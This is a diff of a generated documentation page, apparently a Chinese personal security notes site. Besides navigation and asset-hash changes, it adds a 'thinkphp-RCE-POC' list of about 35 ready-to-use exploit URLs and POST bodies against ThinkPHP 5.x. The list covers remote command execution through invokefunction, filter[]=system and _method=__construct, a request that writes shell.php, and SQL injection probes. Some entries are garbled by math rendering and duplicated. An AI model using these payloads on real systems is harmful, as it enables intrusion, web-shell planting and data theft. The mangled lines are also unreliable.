@@ -24,7 +24,7 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.a3f8f96a.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.1655a90d.min.css">
       
         
         <link rel="stylesheet" href="../../assets/stylesheets/palette.7fa14f5b.min.css">
@@ -394,44 +394,12 @@
       
       <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
       
+        
       
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          Php
-          <span class="md-nav__icon md-icon"></span>
-        </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
         Php
       </a>
-      
-        
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    有问题的函数
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ip" class="md-nav__link">
-    禁用某个ip
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
       
     </li>
   
@@ -3441,28 +3409,8 @@
 <nav class="md-nav md-nav--secondary" aria-label="目录">
   
   
+    
   
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    有问题的函数
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ip" class="md-nav__link">
-    禁用某个ip
-  </a>
-  
-</li>
-      
-    </ul>
   
 </nav>
                   </div>
@@ -3479,8 +3427,6 @@
                   </a>
                 
                 
-                  <h1>Php</h1>
-                
                 <h2 id="_1">有问题的函数<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
 <ol>
 <li>end，和reset,这两个函数返回和赋值顺序有关</li>
@@ -3495,6 +3441,60 @@
 <span class="p">}</span>
 <span class="o">&gt;</span>
 </code></pre></div>
+<h2 id="thinkphp">thinkphp<a class="headerlink" href="#thinkphp" title="Permanent link">&para;</a></h2>
+<h1 id="thinkphp-rce-poc">thinkphp-RCE-POC</br><a class="headerlink" href="#thinkphp-rce-poc" title="Permanent link">&para;</a></h1>
+<p>官方公告:</br>
+1、<a href="https://blog.thinkphp.cn/869075">https://blog.thinkphp.cn/869075</a></br>
+2、<a href="https://blog.thinkphp.cn/910675">https://blog.thinkphp.cn/910675</a></br></p>
+<p>POC：</br></p>
+<h1 id="thinkphp-5022">thinkphp 5.0.22</br><a class="headerlink" href="#thinkphp-5022" title="Permanent link">&para;</a></h1>
+<p>1、<a href="http://192.168.1.1/thinkphp/public/?s=.|think">http://192.168.1.1/thinkphp/public/?s=.|think</a>\config/get&amp;name=database.username</br>
+2、<a href="http://192.168.1.1/thinkphp/public/?s=.|think">http://192.168.1.1/thinkphp/public/?s=.|think</a>\config/get&amp;name=database.password</br>
+3、<a href="http://url/to/thinkphp_5.0.22/?s=index/">http://url/to/thinkphp_5.0.22/?s=index/</a>\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</br>
+4、<a href="http://url/to/thinkphp_5.0.22/?s=index/">http://url/to/thinkphp_5.0.22/?s=index/</a>\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</br></p>
+<h1 id="thinkphp-5">thinkphp 5</br><a class="headerlink" href="#thinkphp-5" title="Permanent link">&para;</a></h1>
+<p>5、<a href="http://127.0.0.1/tp5/public/?s=index/">http://127.0.0.1/tp5/public/?s=index/</a>\think\View/display&amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data=1</br></p>
+<h1 id="thinkphp-5021">thinkphp 5.0.21</br><a class="headerlink" href="#thinkphp-5021" title="Permanent link">&para;</a></h1>
+<p>6、<a href="http://localhost/thinkphp_5.0.21/?s=index/">http://localhost/thinkphp_5.0.21/?s=index/</a>\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</br>
+7、<a href="http://localhost/thinkphp_5.0.21/?s=index/">http://localhost/thinkphp_5.0.21/?s=index/</a>\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</br></p>
+<h1 id="thinkphp-51">thinkphp 5.1.*</br><a class="headerlink" href="#thinkphp-51" title="Permanent link">&para;</a></h1>
+<p>8、<a href="http://url/to/thinkphp5.1.29/?s=index/">http://url/to/thinkphp5.1.29/?s=index/</a>\think\Request/input&amp;filter=phpinfo&amp;data=1</br>
+9、<a href="http://url/to/thinkphp5.1.29/?s=index/">http://url/to/thinkphp5.1.29/?s=index/</a>\think\Request/input&amp;filter=system&amp;data=cmd</br>
+10、<a href="http://url/to/thinkphp5.1.29/?s=index/">http://url/to/thinkphp5.1.29/?s=index/</a>\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</br>
+11、<a href="http://url/to/thinkphp5.1.29/?s=index/">http://url/to/thinkphp5.1.29/?s=index/</a>\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</br>
+12、<a href="http://url/to/thinkphp5.1.29/?s=index/">http://url/to/thinkphp5.1.29/?s=index/</a>\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</br>
+13、<a href="http://url/to/thinkphp5.1.29/?s=index/">http://url/to/thinkphp5.1.29/?s=index/</a>\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd</br>
+14、<a href="http://url/to/thinkphp5.1.29/?s=index/">http://url/to/thinkphp5.1.29/?s=index/</a>\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</br>
+15、<a href="http://url/to/thinkphp5.1.29/?s=index/">http://url/to/thinkphp5.1.29/?s=index/</a>\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd</br></p>
+<h1 id="_2">未知版本</br><a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<p>16、?s=index/\think\module/action/param1/<span><span class="MathJax_Preview">{@phpinfo()}&lt;/br&gt;
+17、?s=index/\think\Module/Action/Param/</span><script type="math/tex">{@phpinfo()}</br>
+17、?s=index/\think\Module/Action/Param/</script></span>{@phpinfo()}</br>
+18、?s=index/\think/module/aciton/param1/${@print(THINK_VERSION)}</br>
+19、index.php?s=/home/article/view_recent/name/1' </br>
+    header = "X-Forwarded-For:1') and extractvalue(1, concat(0x5c,(select md5(233))))#"</br>
+20、index.php?s=/home/shopcart/getPricetotal/tag/1%27</br>
+21、index.php?s=/home/shopcart/getpriceNum/id/1%27</br>
+22、index.php?s=/home/user/cut/id/1%27</br>
+23、index.php?s=/home/service/index/id/1%27</br>
+24、index.php?s=/home/pay/chongzhi/orderid/1%27</br>
+25、index.php?s=/home/pay/index/orderid/1%27</br>
+26、index.php?s=/home/order/complete/id/1%27</br>
+27、index.php?s=/home/order/complete/id/1%27</br>
+28、index.php?s=/home/order/detail/id/1%27</br>
+29、index.php?s=/home/order/cancel/id/1%27</br>
+30、index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+</br>
+31、POST /index.php?s=/home/user/checkcode/ HTTP/1.1</br>
+    Content-Disposition: form-data; name="couponid"</br>
+    1') union select sleep('''+str(sleep_time)+''')#</br></p>
+<h1 id="thinkphp-5023debug">thinkphp 5.0.23（完整版）debug模式</br><a class="headerlink" href="#thinkphp-5023debug" title="Permanent link">&para;</a></h1>
+<p>32、(post)public/index.php (data)_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=touch%20/tmp/xxx</br></p>
+<h1 id="thinkphp-5023">thinkphp 5.0.23(完整版)</br><a class="headerlink" href="#thinkphp-5023" title="Permanent link">&para;</a></h1>
+<p>33、（post）public/index.php?s=captcha (data) _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al</rb></p>
+<h1 id="thinkphp-5010">thinkphp 5.0.10（完整版）</br><a class="headerlink" href="#thinkphp-5010" title="Permanent link">&para;</a></h1>
+<p>34、(post)public/index.php?s=index/index/index (data)s=whoami&amp;_method=__construct&amp;method&amp;filter[]=system</rb></p>
+<h1 id="thinkphp-51-52-50">thinkphp 5.1.<em> 和 5.2.</em> 和 5.0.*</br><a class="headerlink" href="#thinkphp-51-52-50" title="Permanent link">&para;</a></h1>
+<p>35、(post)public/index.php (data)c=exec&amp;f=calc.exe&amp;_method=filter</p>
                 
               
               
@@ -3593,7 +3593,7 @@
     <script id="__config" type="application/json">{"base": "../..", "features": ["tabs"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}, "search": "../../assets/javascripts/workers/search.217ffd95.min.js", "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.926459b3.min.js"></script>
+      <script src="../../assets/javascripts/bundle.6e8eee23.min.js"></script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
